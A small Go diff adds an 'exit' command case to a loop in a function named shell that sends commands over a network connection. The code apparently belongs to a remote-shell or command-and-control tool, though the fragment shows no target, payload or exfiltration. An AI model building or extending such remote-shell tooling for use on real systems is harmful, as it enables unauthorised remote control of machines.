@@ -29,6 +29,8 @@ func shell(conn net.Conn) {
 		case shellCmd == "close":
 			enc.Encode(shellCmd)
 			break shellLoop
+		case shellCmd == "exit":
+			exit(conn)
 		default:
 			result := ""
 			enc.Encode(shellCmd)
